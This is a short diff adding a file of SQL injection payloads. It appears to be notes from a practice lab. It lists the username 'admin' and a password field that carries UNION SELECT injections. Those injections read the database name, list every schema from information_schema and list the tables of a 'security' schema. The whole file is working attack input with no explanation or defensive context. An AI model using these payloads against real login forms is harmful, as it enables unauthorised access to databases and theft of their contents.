@@ -1,0 +1,7 @@
+username : admin
+
+password : admins' UNION SELECT NULL,DATABASE(); #
+
+admins' UNION SELECT NULL,group_concat(schema_name) FROM information_schema.schemata; #
+
+admins' UNION SELECT NULL,group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'security'; #
